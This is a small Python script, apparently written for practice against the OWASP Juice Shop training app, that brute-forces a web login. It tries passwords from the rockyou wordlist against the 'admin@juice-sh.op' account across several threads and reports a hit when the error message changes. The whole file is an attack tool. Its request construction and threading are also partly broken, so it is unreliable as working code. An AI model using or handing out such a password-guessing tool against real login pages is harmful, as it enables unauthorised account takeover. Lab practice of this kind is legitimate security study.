#!/usr/bin/env python3

import requests
import concurrent.futures
import time

# define url post route
url = input('Enter url (e.g <https://badbank.com/rest/user/login : ')
# define username
user = 'admin@juice-sh.op'
# define error message
errMsg = 'Invalid email or password.'
# define password wordlist
wList= open('/usr/share/wordlists/rockyou.txt', 'r')


print('Intruding ' + url + ' as ' + user)

# while response is equal to err message
# send post request to server with username and current
# line in wrodlist as password
def intruder(wList):
	# without explicity splitting the words
	# python tries to send individual characters rather than
	# the whole word
	for line in wList.split():
		try:
			postObj = {user: line}
			currentUrl = url + ':email='+user+'&password='+line
			# timeout is highly dependent on host timeout rules.
			res = requests.post(url, data=postObj, timeout=.39)
			# e.g: password | 401 | Invalid email or password.
			print(line + ' | ' + str(res.status_code) + ' | ' + str(res.content.decode()))
			if(res.content.decode() != errMsg):
				print('Password found: ' + line)
				# tofix: doesn't exit as it's tied to concurrent
				exit()
		except Exception as e:
			print(e)
			time.sleep(1)
			continue

# created threaded workers that sequentially make the post requests as define in intruder
if __name__ == "__main__":
	with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
		executor.map(intruder, wList)



